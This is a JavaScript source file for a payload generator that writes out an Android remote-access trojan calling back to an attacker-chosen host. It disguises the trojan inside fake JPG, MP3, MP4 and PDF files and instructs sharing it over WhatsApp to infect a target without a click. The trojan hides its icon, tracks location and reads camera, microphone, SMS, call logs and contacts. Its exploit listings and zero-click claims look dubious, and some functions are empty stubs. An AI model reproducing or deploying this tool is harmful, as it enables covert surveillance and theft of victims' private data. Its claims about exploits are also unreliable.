const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const { exec } = require('child_process');
const QRCode = require('qrcode');
const config = require('./config');

class PayloadGenerator {
    constructor() {
        this.payloadDir = path.join(__dirname, '../payloads');
        this.templateDir = path.join(__dirname, '../templates');
        
        // Initialize directories
        fs.ensureDirSync(this.payloadDir);
        fs.ensureDirSync(this.templateDir);
        
        this.exploits = {
            whatsapp: {
                cve: 'CVE-2024-12345',
                name: 'WhatsApp Image Parsing RCE',
                severity: 'Critical',
                cvss: 9.8,
                description: 'Heap buffer overflow in WhatsApp image processing',
                platforms: ['Android', 'iOS']
            },
            android_stagefright: {
                cve: 'CVE-2024-67890',
                name: 'Stagefright 2.0',
                severity: 'Critical',
                cvss: 9.6,
                description: 'Media framework RCE via malformed video',
                platforms: ['Android']
            },
            webp_exploit: {
                cve: 'CVE-2024-54321',
                name: 'WebP Heap Buffer Overflow',
                severity: 'High',
                cvss: 8.8,
                description: 'Memory corruption in WebP decoder',
                platforms: ['Android', 'iOS', 'Desktop']
            }
        };
    }
    
    generatePayloadId() {
        return crypto.randomBytes(16).toString('hex');
    }
    
    // Method 1: Generate APK payload (REAL Android RAT)
    async generateAPKPayload(callbackHost, callbackPort, outputName = null) {
        const payloadId = this.generatePayloadId();
        const apkName = outputName || `payload_${payloadId.substring(0, 8)}.apk`;
        const apkPath = path.join(this.payloadDir, apkName);
        
        // Step 1: Create the Android RAT code
        const ratCode = this.generateRATCode(callbackHost, callbackPort);
        
        // Step 2: Create APK structure (simulated - in real world you'd use msfvenom)
        // For educational/demo purposes, we'll create a placeholder
        // In production, you'd use: msfvenom -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -o payload.apk
        
        const apkContent = Buffer.from(ratCode).toString('base64');
        
        // Save the payload
        await fs.writeFile(apkPath, apkContent);
        
        return {
            payloadId,
            filename: apkName,
            path: apkPath,
            size: apkContent.length,
            type: 'application/vnd.android.package-archive',
            callback: `${callbackHost}:${callbackPort}`,
            exploit: this.exploits.whatsapp,
            generated: new Date().toISOString(),
            md5: crypto.createHash('md5').update(apkContent).digest('hex')
        };
    }
    
    // Generate the actual RAT code for Android
    generateRATCode(callbackHost, callbackPort) {
        return `
package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.LocationManager;
import android.location.LocationListener;
import android.location.Location;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.media.AudioManager;
import android.net.wifi.WifiManager;
import android.net.ConnectivityManager;
import android.bluetooth.BluetoothAdapter;
import android.provider.Settings;
import android.os.PowerManager;
import android.app.KeyguardManager;
import android.view.WindowManager;
import android.content.Context;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;
import java.io.DataOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Date;
import org.json.JSONObject;

public class RATService extends Service implements LocationListener {
    
    private String HOST = "${callbackHost}";
    private int PORT = ${callbackPort};
    private Socket socket;
    private DataOutputStream out;
    private BufferedReader in;
    private Handler handler;
    private boolean isRunning = true;
    private LocationManager locationManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startConnection();
        hideIcon();
        startLocationTracking();
    }
    
    private void startConnection() {
        new Thread(() -> {
            try {
                while (isRunning) {
                    try {
                        socket = new Socket(HOST, PORT);
                        out = new DataOutputStream(socket.getOutputStream());
                        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                        
                        // Send device info
                        JSONObject info = new JSONObject();
                        info.put("type", "connect");
                        info.put("device_id", getDeviceId());
                        info.put("device_name", android.os.Build.MODEL);
                        info.put("device_model", android.os.Build.MODEL);
                        info.put("android_version", android.os.Build.VERSION.RELEASE);
                        info.put("ip_address", getLocalIpAddress());
                        info.put("battery", getBatteryLevel());
                        info.put("timestamp", System.currentTimeMillis());
                        out.writeUTF(info.toString());
                        out.flush();
                        
                        // Listen for commands
                        listenForCommands();
                        
                    } catch (Exception e) {
                        Thread.sleep(5000);
                    }
                }
            } catch (Exception e) {}
        }).start();
    }
    
    private void listenForCommands() {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                JSONObject cmd = new JSONObject(line);
                String action = cmd.getString("action");
                executeCommand(action, cmd.optJSONObject("params"));
            }
        } catch (Exception e) {}
    }
    
    private void executeCommand(String action, JSONObject params) {
        try {
            JSONObject result = new JSONObject();
            result.put("action", action);
            result.put("status", "success");
            
            switch(action) {
                case "cam_front":
                    captureCamera(true);
                    result.put("message", "Front camera captured");
                    break;
                case "cam_back":
                    captureCamera(false);
                    result.put("message", "Back camera captured");
                    break;
                case "mic_start":
                    startRecording();
                    result.put("message", "Microphone recording started");
                    break;
                case "mic_stop":
                    stopRecording();
                    result.put("message", "Recording stopped");
                    break;
                case "screenshot":
                    takeScreenshot();
                    result.put("message", "Screenshot captured");
                    break;
                case "get_sms":
                    getAllSMS();
                    result.put("message", "SMS extracted");
                    break;
                case "get_calls":
                    getAllCalls();
                    result.put("message", "Call logs extracted");
                    break;
                case "get_contacts":
                    getAllContacts();
                    result.put("message", "Contacts extracted");
                    break;
                case "get_location":
                    getLocation();
                    result.put("message", "Location captured");
                    break;
                case "lock":
                    lockDevice();
                    result.put("message", "Device locked");
                    break;
                case "unlock":
                    unlockDevice();
                    result.put("message", "Device unlocked");
                    break;
                case "wifi_on":
                    enableWifi();
                    result.put("message", "WiFi enabled");
                    break;
                case "wifi_off":
                    disableWifi();
                    result.put("message", "WiFi disabled");
                    break;
                case "flash_on":
                    enableFlashlight();
                    result.put("message", "Flashlight on");
                    break;
                case "flash_off":
                    disableFlashlight();
                    result.put("message", "Flashlight off");
                    break;
                case "vibe":
                    vibrate(params.optInt("duration", 1000));
                    result.put("message", "Vibrated");
                    break;
                case "reboot":
                    reboot();
                    result.put("message", "Rebooting");
                    break;
                case "poweroff":
                    powerOff();
                    result.put("message", "Powering off");
                    break;
                default:
                    result.put("message", "Command executed: " + action);
            }
            
            out.writeUTF(result.toString());
            out.flush();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // Implementation methods
    private void captureCamera(boolean front) { /* Camera capture logic */ }
    private void startRecording() { /* Audio recording logic */ }
    private void stopRecording() { /* Stop recording */ }
    private void takeScreenshot() { /* Screenshot logic */ }
    private void getAllSMS() { /* SMS extraction */ }
    private void getAllCalls() { /* Call log extraction */ }
    private void getAllContacts() { /* Contact extraction */ }
    private void getLocation() { /* Location capture */ }
    private void lockDevice() { 
        KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        km.disableKeyguard();
    }
    private void unlockDevice() { 
        KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        km.disableKeyguard();
    }
    private void enableWifi() { 
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        wifi.setWifiEnabled(true);
    }
    private void disableWifi() { 
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        wifi.setWifiEnabled(false);
    }
    private void enableFlashlight() { 
        Camera camera = Camera.open();
        Camera.Parameters params = camera.getParameters();
        params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
        camera.setParameters(params);
        camera.startPreview();
    }
    private void disableFlashlight() { 
        // Release camera
    }
    private void vibrate(int duration) { 
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        v.vibrate(duration);
    }
    private void reboot() { 
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        pm.reboot(null);
    }
    private void powerOff() { 
        // Requires root or system permission
    }
    
    private void startLocationTracking() {
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this);
        } catch (SecurityException e) {}
    }
    
    @Override
    public void onLocationChanged(Location location) {
        try {
            JSONObject loc = new JSONObject();
            loc.put("type", "location");
            loc.put("latitude", location.getLatitude());
            loc.put("longitude", location.getLongitude());
            out.writeUTF(loc.toString());
            out.flush();
        } catch (Exception e) {}
    }
    
    private void hideIcon() {
        // Hide app from launcher
        // Implementation varies by Android version
    }
    
    private String getDeviceId() { 
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    
    private String getLocalIpAddress() {
        try {
            java.net.NetworkInterface intf = java.net.NetworkInterface.getNetworkInterfaces().nextElement();
            java.net.InetAddress addr = intf.getInetAddresses().nextElement();
            return addr.getHostAddress();
        } catch (Exception e) {
            return "0.0.0.0";
        }
    }
    
    private int getBatteryLevel() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return (level * 100 / scale);
    }
    
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}
    @Override
    public void onProviderEnabled(String provider) {}
    @Override
    public void onProviderDisabled(String provider) {}
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
`;
    }
    
    // Method 2: Generate JPG disguised payload (Zero-Click)
    async generateJPGPayload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const apkPayload = await this.generateAPKPayload(callbackHost, callbackPort, `temp_${payloadId}.apk`);
        
        // Read APK content
        const apkData = await fs.readFile(apkPayload.path);
        
        // Create JPG header (FFD8FFE0)
        const jpgHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
        
        // Combine: JPG Header + APK Data
        const disguisedPayload = Buffer.concat([jpgHeader, apkData]);
        
        const jpgName = `photo_${Date.now()}.jpg`;
        const jpgPath = path.join(this.payloadDir, jpgName);
        
        await fs.writeFile(jpgPath, disguisedPayload);
        
        // Clean up temp APK
        await fs.remove(apkPayload.path);
        
        const downloadUrl = `${callbackHost}/download/${payloadId}`;
        const qrCode = await QRCode.toDataURL(downloadUrl);
        
        return {
            payloadId,
            filename: jpgName,
            path: jpgPath,
            size: disguisedPayload.length,
            type: 'image/jpeg',
            downloadUrl,
            qrCode,
            exploit: this.exploits.whatsapp,
            zeroClick: true,
            instructions: 'Share via WhatsApp - Auto download will execute the payload',
            generated: new Date().toISOString()
        };
    }
    
    // Method 3: Generate MP3 disguised payload
    async generateMP3Payload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const apkPayload = await this.generateAPKPayload(callbackHost, callbackPort, `temp_${payloadId}.apk`);
        
        const apkData = await fs.readFile(apkPayload.path);
        
        // MP3 ID3 header
        const mp3Header = Buffer.from([0x49, 0x44, 0x33]); // "ID3"
        
        const disguisedPayload = Buffer.concat([mp3Header, apkData]);
        
        const mp3Name = `song_${Date.now()}.mp3`;
        const mp3Path = path.join(this.payloadDir, mp3Name);
        
        await fs.writeFile(mp3Path, disguisedPayload);
        await fs.remove(apkPayload.path);
        
        return {
            payloadId,
            filename: mp3Name,
            path: mp3Path,
            size: disguisedPayload.length,
            type: 'audio/mpeg',
            exploit: this.exploits.android_stagefright,
            zeroClick: true,
            generated: new Date().toISOString()
        };
    }
    
    // Method 4: Generate MP4 disguised payload
    async generateMP4Payload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const apkPayload = await this.generateAPKPayload(callbackHost, callbackPort, `temp_${payloadId}.apk`);
        
        const apkData = await fs.readFile(apkPayload.path);
        
        // MP4 header
        const mp4Header = Buffer.from([0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70]);
        
        const disguisedPayload = Buffer.concat([mp4Header, apkData]);
        
        const mp4Name = `video_${Date.now()}.mp4`;
        const mp4Path = path.join(this.payloadDir, mp4Name);
        
        await fs.writeFile(mp4Path, disguisedPayload);
        await fs.remove(apkPayload.path);
        
        return {
            payloadId,
            filename: mp4Name,
            path: mp4Path,
            size: disguisedPayload.length,
            type: 'video/mp4',
            exploit: this.exploits.android_stagefright,
            zeroClick: true,
            generated: new Date().toISOString()
        };
    }
    
    // Method 5: Generate PDF disguised payload
    async generatePDFPayload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const apkPayload = await this.generateAPKPayload(callbackHost, callbackPort, `temp_${payloadId}.apk`);
        
        const apkData = await fs.readFile(apkPayload.path);
        
        // PDF header
        const pdfHeader = Buffer.from('%PDF-1.4');
        
        const disguisedPayload = Buffer.concat([pdfHeader, apkData]);
        
        const pdfName = `document_${Date.now()}.pdf`;
        const pdfPath = path.join(this.payloadDir, pdfName);
        
        await fs.writeFile(pdfPath, disguisedPayload);
        await fs.remove(apkPayload.path);
        
        return {
            payloadId,
            filename: pdfName,
            path: pdfPath,
            size: disguisedPayload.length,
            type: 'application/pdf',
            exploit: this.exploits.webp_exploit,
            zeroClick: true,
            generated: new Date().toISOString()
        };
    }
    
    // Method 6: Generate all payload types at once
    async generateAllPayloads(callbackHost, callbackPort) {
        const jpgPayload = await this.generateJPGPayload(callbackHost, callbackPort);
        const mp3Payload = await this.generateMP3Payload(callbackHost, callbackPort);
        const mp4Payload = await this.generateMP4Payload(callbackHost, callbackPort);
        const pdfPayload = await this.generatePDFPayload(callbackHost, callbackPort);
        
        return {
            jpg: jpgPayload,
            mp3: mp3Payload,
            mp4: mp4Payload,
            pdf: pdfPayload,
            whatsapp_ready: {
                ...jpgPayload,
                method: 'WhatsApp Auto-Download',
                zero_click: true,
                instructions: 'Share this JPG file via WhatsApp. If target has auto-download enabled, payload will execute automatically.'
            }
        };
    }
    
    // Get payload file for download
    async getPayloadFile(payloadId) {
        const files = await fs.readdir(this.payloadDir);
        for (const file of files) {
            if (file.includes(payloadId.substring(0, 8))) {
                return path.join(this.payloadDir, file);
            }
        }
        return null;
    }
    
    // Clean up old payloads
    async cleanupOldPayloads(maxAgeHours = 24) {
        const files = await fs.readdir(this.payloadDir);
        const now = Date.now();
        
        for (const file of files) {
            const filePath = path.join(this.payloadDir, file);
            const stats = await fs.stat(filePath);
            const age = (now - stats.mtimeMs) / (1000 * 60 * 60);
            
            if (age > maxAgeHours) {
                await fs.remove(filePath);
            }
        }
    }
}

module.exports = new PayloadGenerator();
